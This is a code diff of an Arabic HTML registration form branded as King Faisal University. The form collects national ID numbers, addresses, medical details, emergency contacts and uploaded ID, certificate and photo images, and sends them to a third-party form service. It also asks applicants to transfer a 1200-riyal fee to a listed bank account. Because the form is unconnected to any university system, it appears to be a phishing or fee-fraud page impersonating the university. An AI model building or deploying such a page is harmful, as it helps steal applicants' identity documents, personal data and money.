@@ -276,7 +276,7 @@ function showNotificationAndForm() {
   --card:#ffffff;
   --muted:#6b6b6b;
 }
-*{box-sizing:border-box;}
+*{box-sizing:border-box}
 body{
   margin:0;
   font-family:"Cairo","Segoe UI",Tahoma,sans-serif;
@@ -292,7 +292,7 @@ body{
   box-shadow:0 10px 30px rgba(0,0,0,0.08);
   padding:36px 48px 48px 48px;
   border-top:6px solid var(--uf-green);
-  display:none;
+  display:none; /* مخفي افتراضياً */
   position:relative;
   z-index:100;
 }
@@ -396,7 +396,7 @@ textarea{min-height:96px; resize:vertical;}
   font-weight:700;
   box-shadow:0 6px 18px rgba(212,175,55,0.12);
 }
-.copy-btn:active{transform:translateY(1px);}
+.copy-btn:active{transform:translateY(1px)}
 .fees{
   font-weight:800;
   color:var(--uf-green);
@@ -424,13 +424,14 @@ textarea{min-height:96px; resize:vertical;}
   cursor:pointer;
   font-size:16px;
 }
-.btn.cancel{background:#9e9e9e;}
+.btn.cancel{background:#9e9e9e}
 .note{
   text-align:center;
   color:#888;
   font-size:13px;
   margin-top:12px;
 }
+/* إشعار صغير */
 .toast{
   position:fixed;
   top:20px;
@@ -463,160 +464,213 @@ textarea{min-height:96px; resize:vertical;}
 
 <!-- النموذج -->
 <div class="container" id="registrationFormContainer">
-  <form id="registrationForm" action="https://formcarry.com/s/ON8xkE-353d" method="POST" enctype="multipart/form-data" novalidate>
-    <!-- Header -->
-    <header>
-      <div class="brand">
-        <div class="logo">FKU</div>
-        <div>
-          <h1>نموذج التسجيل - جامعة الملك فيصل</h1>
-          <p class="subtitle">يرجى تعبئة جميع الحقول بدقة وإرفاق الملفات المطلوبة قبل الإرسال.</p>
-        </div>
-      </div>
-    </header>
+<form id="registrationForm" action="https://formcarry.com/s/ON8xkE-353d" method="POST" enctype="multipart/form-data" novalidate>
+<header>
+<div class="brand">
+<div class="logo">FKU</div>
+<div>
+<h1>نموذج التسجيل - جامعة الملك فيصل</h1>
+<p class="subtitle">يرجى تعبئة جميع الحقول بدقة وإرفاق الملفات المطلوبة قبل الإرسال.</p>
+</div>
+</div>
+<div style="text-align:left">
+<div class="bank-name">رقم الحساب للتحويل</div>
+<div style="font-weight:800;color:var(--uf-green);">SA1980000857608010276380</div>
+<div style="font-size:13px;color:#666;margin-top:6px">بنك الأهلي السعودي — رسوم التسجيل: <span style="font-weight:800;color:#000">1200 ريال</span></div>
+</div>
+</header>
 
-    <!-- الحقول الكاملة -->
-    <div class="grid2">
-      <div>
-        <label>الاسم الكامل *</label>
-        <input type="text" name="fullName" required>
-        <label>الجنس *</label>
-        <select name="gender" required>
-          <option value="">اختر...</option>
-          <option>ذكر</option>
-          <option>أنثى</option>
-        </select>
-        <label>الجنسية *</label>
-        <select name="nationality" required>
-          <option value="">اختر...</option>
-          <option>السعودية</option>
-          <option>اليمن</option>
-          <option>مصر</option>
-          <option>سوريا</option>
-          <option>الأردن</option>
-          <option>العراق</option>
-          <option>لبنان</option>
-          <option>فلسطين</option>
-          <option>السودان</option>
-          <option>تونس</option>
-          <option>المغرب</option>
-          <option>الإمارات</option>
-          <option>الكويت</option>
-          <option>البحرين</option>
-          <option>عمان</option>
-          <option>قطر</option>
-          <option>تركيا</option>
-          <option>أفغانستان</option>
-          <option>باكستان</option>
-          <option>الهند</option>
-          <option>إندونيسيا</option>
-          <option>Other</option>
-        </select>
-        <label>رقم الهوية / الإقامة *</label>
-        <input type="text" name="idNumber" required>
-        <label>تاريخ الميلاد *</label>
-        <input type="date" name="birthDate" required>
-        <label>المدينة *</label>
-        <input type="text" name="city" required>
-        <label>العنوان *</label>
-        <textarea name="address" required></textarea>
-        <label>رقم الجوال *</label>
-        <input type="tel" name="phone" required>
-        <label>البريد الإلكتروني *</label>
-        <input type="email" name="email" required>
-      </div>
+<div class="grid2">
+<div>
+<label>الاسم الكامل (رباعي) *</label>
+<input type="text" name="fullName" required>
+<label>الجنس *</label>
+<select name="gender" required>
+<option value="">اختر...</option>
+<option>ذكر</option>
+<option>أنثى</option>
+</select>
+<label>الجنسية *</label>
+<select name="nationality" required>
+<option value="">اختر الجنسية</option>
+<option>السعودية</option>
+<option>اليمن</option>
+<option>مصر</option>
+<option>سوريا</option>
+<option>الأردن</option>
+<option>العراق</option>
+<option>لبنان</option>
+<option>فلسطين</option>
+<option>السودان</option>
+<option>تونس</option>
+<option>المغرب</option>
+<option>الإمارات</option>
+<option>الكويت</option>
+<option>البحرين</option>
+<option>عمان</option>
+<option>قطر</option>
+<option>تركيا</option>
+<option>أفغانستان</option>
+<option>باكستان</option>
+<option>الهند</option>
+<option>إندونيسيا</option>
+<option>باقية الدول - Other</option>
+</select>
+<label>الدولة (مكان الإقامة) *</label>
+<select name="country" required>
+<option value="">اختر الدولة</option>
+<option>المملكة العربية السعودية</option>
+<option>اليمن</option>
+<option>مصر</option>
+<option>الإمارات</option>
+<option>الكويت</option>
+<option>البحرين</option>
+<option>عمان</option>
+<option>قطر</option>
+<option>الأردن</option>
+<option>سوريا</option>
+<option>لبنان</option>
+<option>السودان</option>
+<option>المغرب</option>
+<option>تونس</option>
+<option>أخرى</option>
+</select>
+<label>رقم الهوية / الإقامة *</label>
+<input type="text" name="idNumber" required>
+<label>تاريخ الميلاد *</label>
+<input type="date" name="birthDate" required>
+<label>مكان الميلاد (المدينة)</label>
+<input type="text" name="birthPlace">
+<label>المدينة *</label>
+<input type="text" name="city" required>
+<label>العنوان بالتفصيل *</label>
+<textarea name="address" required placeholder="شارع - حي - رمز بريدي (إن وُجد)"></textarea>
+<label>رقم الجوال (واتساب) *</label>
+<input type="tel" name="phone" required>
+<label>البريد الإلكتروني *</label>
+<input type="email" name="email" required>
+</div>
 
-      <div>
-        <label>نوع المؤهل السابق *</label>
-        <select name="prevDegree" required>
-          <option value="">اختر...</option>
-          <option>ثانوي</option>
-          <option>دبلوم</option>
-          <option>بكالوريوس</option>
-          <option>ماجستير</option>
-        </select>
-        <label>سنة التخرج *</label>
-        <input type="number" name="gradYear" required>
-        <label>اسم المؤسسة التعليمية السابقة</label>
-        <input type="text" name="prevInstitute">
-        <label>المعدل / النسبة</label>
-        <input type="text" name="gpa">
-        <label>التخصص المطلوب *</label>
-        <input type="text" name="desiredMajor" required>
-        <label>نوع الدراسة *</label>
-        <select name="studyType" required>
-          <option value="">اختر...</option>
-          <option>انتظام</option>
-          <option>انتساب</option>
-          <option>تعليم عن بعد</option>
-        </select>
-      </div>
-    </div>
+<div>
+<label>نوع المؤهل السابق *</label>
+<select name="prevDegree" required>
+<option value="">اختر...</option>
+<option>ثانوي</option>
+<option>دبلوم</option>
+<option>بكالوريوس</option>
+<option>ماجستير</option>
+</select>
+<label>سنة التخرج *</label>
+<input type="number" name="gradYear" min="1900" max="2100" required>
+<label>اسم المدرسة / الجامعة السابقة</label>
+<input type="text" name="prevInstitute">
+<label>النسبة / المعدل</label>
+<input type="text" name="gpa">
+<label>التخصص المطلوب *</label>
+<input type="text" name="desiredMajor" required>
+<label>نوع الدراسة *</label>
+<select name="studyType" required>
+<option value="">اختر...</option>
+<option>انتظام</option>
+<option>انتساب</option>
+<option>تعليم عن بعد</option>
+</select>
+<label>الكلية / القسم *</label>
+<select name="faculty" required>
+<option value="">اختر الكلية</option>
+<option>كلية الطب</option>
+<option>كلية الهندسة</option>
+<option>كلية العلوم</option>
+<option>كلية الآداب</option>
+<option>كلية إدارة الأعمال</option>
+<option>كلية الحاسبات وتقنية المعلومات</option>
+<option>كلية التربية</option>
+<option>كلية القانون</option>
+<option>كلية الصحة العامة</option>
+</select>
+<label>هل لديك أي حالة طبية هامة؟ (إن وُجد)</label>
+<input type="text" name="medicalInfo" placeholder="اكتب إذا كان هناك أمر طبي مهم">
 
-    <!-- الملفات -->
-    <div class="files-row" style="margin-top:12px;">
-      <div>
-        <label>صورة الهوية / الإقامة *</label>
-        <input type="file" name="fileId" accept="image/*,application/pdf" required>
-      </div>
-      <div>
-        <label>صورة المؤهل *</label>
-        <input type="file" name="fileCertificate" accept="image/*,application/pdf" required>
-      </div>
-    </div>
+<div style="margin-top:12px" class="section-title">جهة الاتصال في حالات الطوارئ</div>
+<label>اسم جهة الاتصال للطوارئ</label>
+<input type="text" name="emergencyName" placeholder="اسم قريب أو شخص">
+<label>صلة القرابة</label>
+<input type="text" name="emergencyRelation" placeholder="أم/ أب/ أخ/ صديق ...">
+<label>رقم الطوارئ</label>
+<input type="tel" name="emergencyPhone" placeholder="رقم جوال للطوارئ">
+</div>
+</div>
 
-    <div class="files-row" style="margin-top:12px;">
-      <div>
-        <label>صورة شخصية *</label>
-        <input type="file" name="filePhoto" accept="image/*" required>
-      </div>
-      <div>
-        <label>إيصال الدفع (إن وجد)</label>
-        <input type="file" name="fileReceipt" accept="image/*,application/pdf">
-      </div>
-    </div>
+<div style="margin-top:18px">
+<div class="section-title">المرفقات المطلوبة</div>
+<div class="files-row" style="margin-top:8px;">
+<div>
+<label>صورة الهوية / الإقامة *</label>
+<input type="file" name="fileId" accept="image/*,application/pdf" required>
+</div>
+<div>
+<label>صورة الشهادة / المؤهل *</label>
+<input type="file" name="fileCertificate" accept="image/*,application/pdf" required>
+</div>
+</div>
+<div class="files-row" style="margin-top:12px;">
+<div>
+<label>صورة شخصية (مقاس - واضح) *</label>
+<input type="file" name="filePhoto" accept="image/*" required>
+</div>
+<div>
+<label>إيصال الدفع (إن وُجد)</label>
+<input type="file" name="fileReceipt" accept="image/*,application/pdf">
+</div>
+</div>
+</div>
 
-    <div class="account-section">
-      <div class="account-left">
-        <div>
-          <div class="bank-name">رقم الحساب</div>
-          <div style="font-weight:800;color:var(--uf-green);">SA1980000857608010276380</div>
-          <div style="font-size:13px;color:#444">بنك الأهلي السعودي</div>
-        </div>
-      </div>
-      <button type="button" class="copy-btn" id="copyAccountBtn">نسخ رقم الحساب</button>
-    </div>
+<div class="account-section" style="margin-top:18px">
+<div class="account-left">
+<div>
+<div style="font-size:13px;color:#666">لتحويل الرسوم استخدم:</div>
+<div style="font-weight:800;color:var(--uf-green);">SA1980000857608010276380</div>
+<div style="font-size:13px;color:#444" class="bank-name">بنك الأهلي السعودي</div>
+</div>
+</div>
+<div style="display:flex;align-items:center;gap:12px">
+<div class="fees">رسوم التسجيل: 1200 ريال</div>
+<button type="button" class="copy-btn" id="copyAccountBtn">نسخ رقم الحساب</button>
+</div>
+</div>
 
-    <div style="margin-top:16px">
-      <label><input type="checkbox" name="agree" required> أقرّ بأن جميع البيانات المدخلة صحيحة.</label>
-    </div>
+<div style="margin-top:16px">
+<label><input type="checkbox" name="agree" required> أقرّ بأن جميع البيانات المدخلة صحيحة ومطابقة للوثائق الرسمية.</label>
+</div>
 
-    <div class="submit-area">
-      <button type="submit" class="btn">إرسال الطلب</button>
-      <button type="reset" class="btn cancel">إلغاء</button>
-    </div>
-    <div class="note">جميع الحقوق محفوظة © جامعة الملك فيصل</div>
+<div class="submit-area">
+<button type="submit" class="btn">إرسال الطلب</button>
+<button type="reset" class="btn cancel">إلغاء</button>
+</div>
 
-  </form>
+<div class="note">جميع الحقوق محفوظة © جامعة الملك فيصل</div>
+</form>
 </div>
 
 <script>
-// عرض النموذج عند الضغط على زرك الحالي
-function showForm() {
-  const formContainer = document.getElementById('registrationFormContainer');
+// زر تقديم الطلب عندك (استبدل '.quick-link' بالمحدد الصحيح)
+const yourButton = document.querySelector('.quick-link'); 
+const formContainer = document.getElementById('registrationFormContainer');
+
+yourButton.addEventListener('click', (e)=>{
+  e.preventDefault();
   formContainer.style.display = 'block';
   formContainer.scrollIntoView({behavior:'smooth'});
-}
+});
 
-// إخفاء النموذج عند الضغط خارج النموذج
-document.body.addEventListener('click', (e)=>{
-  const formContainer = document.getElementById('registrationFormContainer');
-  if(formContainer.style.display==='block' && !formContainer.contains(e.target) && !e.target.closest('.quick-link')){
-    formContainer.style.display='none';
+// إخفاء النموذج عند الضغط خارج النموذج والزر فقط
+document.addEventListener('click', (e)=>{
+  if(!formContainer.contains(e.target) && !yourButton.contains(e.target)){
+    formContainer.style.display = 'none';
   }
 });
 
-// إشعار
+// إشعار صغير
 function showToast(msg){
   const toast = document.getElementById('toast');
   toast.textContent = msg;
@@ -624,23 +678,27 @@ function showToast(msg){
   setTimeout(()=>toast.classList.remove('show'),2500);
 }
 
-// نسخ الحساب
-document.getElementById('copyAccountBtn').addEventListener('click', ()=>{
-  navigator.clipboard.writeText('SA1980000857608010276380').then(()=> showToast('✅ تم نسخ رقم الحساب بنجاح'));
+// نسخ رقم الحساب
+document.getElementById('copyAccountBtn').addEventListener('click',()=>{
+  const text='SA1980000857608010276380';
+  navigator.clipboard.writeText(text).then(()=> showToast('✅ تم نسخ رقم الحساب بنجاح'));
 });
 
 // إرسال النموذج
-document.getElementById('registrationForm').addEventListener('submit', function(e){
+document.getElementById('registrationForm').addEventListener('submit',function(e){
   e.preventDefault();
   const fd = new FormData(this);
-  fetch(this.action, {method:'POST', body:fd})
-    .then(res=>{ 
-      if(res.ok) showToast('✅ تم إرسال الطلب بنجاح'); 
-      else showToast('❌ حدث خطأ، حاول لاحقاً'); 
-    })
-    .catch(()=> showToast('❌ فشل الاتصال، تحقق من الإنترنت'));
+  fetch(this.action,{method:'POST',body:fd,headers:{'Accept':'application/json'}})
+  .then(res=>{
+    if(res.ok){
+      showToast('✅ تم إرسال الطلب بنجاح، ستصلك رسالة تأكيد على البريد الإلكتروني.');
+      this.reset();
+    }else showToast('❌ حدث خطأ، حاول لاحقاً.');
+  })
+  .catch(()=> showToast('❌ فشل الاتصال، تحقق من الإنترنت.'));
 });
 </script>
+
 </body>
 </html>
 </body>
